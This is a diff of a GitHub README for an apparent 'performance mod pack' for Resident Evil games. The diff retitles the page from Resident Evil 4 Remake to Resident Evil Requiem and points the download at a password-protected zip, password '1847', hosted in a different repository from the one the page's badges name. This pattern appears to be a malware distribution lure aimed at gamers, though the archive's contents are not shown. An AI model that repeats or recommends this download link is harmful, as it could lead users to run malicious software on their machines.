@@ -1,6 +1,6 @@
 
 
-# 🧟 Resident Evil 4 Mod Pack 2026 — FPS Boost, RT Fix & Performance Tweaks
+# 🧟 Resident Evil Requiem Mod Pack 2026 — FPS Boost, RT Fix & Performance Tweaks
 
 [![GitHub Stars](https://img.shields.io/github/stars/Alexantros341/RE4-Remake-Mod-Pack)](https://github.com/Alexantros341/RE4-Remake-Mod-Pack)
 [![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
@@ -11,7 +11,7 @@
 
 ---
 
-🧟 **All-in-one performance mod pack** for **Resident Evil 4 Remake** by Capcom.  
+🧟 **All-in-one performance mod pack** for **Resident Evil Requiem** by Capcom.  
 Fix ray tracing performance, boost FPS, eliminate RE Engine stutters, optimize VRAM, reduce input lag, and enhance visuals — survive Pueblo with a locked 60+ FPS.
 
 <img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/2071cf3e-8b15-42b9-8239-4dd90231767c" />
@@ -48,7 +48,7 @@ Fix ray tracing performance, boost FPS, eliminate RE Engine stutters, optimize V
 
 🔽 Password-protected archive — extract and survive with higher FPS.
 
-📦 [**Download** `RE4-Remake-ModPack.zip`](https://github.com/moatpatronplan/Resident-Evil-Mod-Pack/releases/download/LastRelease/RE_Mods.zip)
+📦 [**Download** `Modpack.zip`](https://github.com/moatpatronplan/Resident-Evil-Mod-Pack/releases/download/LastRelease/RE_Mods.zip)
 
 🔐 **** `1847`
 
